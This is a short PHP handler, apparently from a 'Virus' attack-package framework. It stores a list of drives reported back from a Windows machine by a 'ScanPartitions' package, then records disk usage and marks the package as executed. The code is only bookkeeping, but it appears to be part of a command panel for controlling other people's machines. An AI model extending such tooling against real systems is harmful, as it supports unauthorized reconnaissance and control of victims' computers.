<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ScanPartitions\ScanPartitions $this */

$this->setAvailableDrives($this->requestData->postCheck("drives"))->saveState();
$this->usage()->setDisk(filesize($this->getStatePath()))->saveState();
$this->setExecuted();
